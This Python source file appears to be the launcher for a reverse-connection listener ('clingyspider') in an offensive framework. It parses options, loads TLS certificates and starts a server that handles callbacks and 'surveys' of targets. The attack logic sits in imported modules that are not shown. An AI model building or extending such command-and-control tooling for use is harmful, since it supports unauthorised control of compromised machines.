from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import ssl
import sys
import sqlite3
import secrets
import eternalhush as eh
from additional.clingyspider import __web_server
from additional.clingyspider import __connection_handlers
from additional.clingyspider import __on_ready_callback
import os
import json
import base64
import time

def main(args):
    if args.protocol == "http":
        server = __web_server.HttpWebServer()
        server.set_port(args.port)
        server.set_keypath(args.key)
        handler = __connection_handlers.ReverseHttpHandler()
        handler.set_on_ready_callback(__on_ready_callback.ClingyspiderDefaultCallback)
        if args.nosurvey:
            handler.nosurvey = True
        else:
            handler.nosurvey = False
        if args.survey_rescan == None:
            eh.ui.SetEnv("CLSP_SURVEY_RESCAN_TARGET", 'ask')
        elif args.survey_rescan.lower() == 'yes':
            eh.ui.SetEnv("CLSP_SURVEY_RESCAN_TARGET", 'true')
        elif args.survey_rescan.lower() == 'no':
            eh.ui.SetEnv("CLSP_SURVEY_RESCAN_TARGET", 'false')
        else:
            eh.ui.Echo(f"Unkown argument '-survey_rescan' value '{args.survey_rescan}', switching to 'yes'", eh.ECHO_WARNING)
            eh.ui.SetEnv("CLSP_SURVEY_RESCAN_TARGET", 'true')
        server.set_handler(handler)
        server.start()

    if args.protocol == "https":
        server = __web_server.SslHttpWebServer()
        if args.ssl_cert == None or not os.path.isfile(args.ssl_cert):
            eh.ui.Echo("Failed to open ssl certificate!", eh.ECHO_ERROR)
            return
        if args.ssl_key == None or not os.path.isfile(args.ssl_key):
            eh.ui.Echo("Failed to open ssl private key!", eh.ECHO_ERROR)
            return
        server.set_ssl_cert(args.ssl_cert)
        server.set_ssl_private_key(args.ssl_key)
        server.set_port(args.port)
        server.set_keypath(args.key)
        handler = __connection_handlers.SslReverseHttpHandler()
        handler.set_on_ready_callback(__on_ready_callback.ClingyspiderDefaultCallback)
        if args.nosurvey:
            handler.nosurvey = True
        else:
            handler.nosurvey = False
        if args.survey_rescan == None:
            eh.ui.SetEnv("CLSP_SURVEY_RESCAN_TARGET", 'ask')
        elif args.survey_rescan.lower() == 'yes':
            eh.ui.SetEnv("CLSP_SURVEY_RESCAN_TARGET", 'true')
        elif args.survey_rescan.lower() == 'no':
            eh.ui.SetEnv("CLSP_SURVEY_RESCAN_TARGET", 'false')
        else:
            eh.ui.Echo(f"Unkown argument '-survey_rescan' value '{args.survey_rescan}', switching to 'yes'", eh.ECHO_WARNING)
            eh.ui.SetEnv("CLSP_SURVEY_RESCAN_TARGET", 'true')
        server.set_handler(handler)
        server.start()


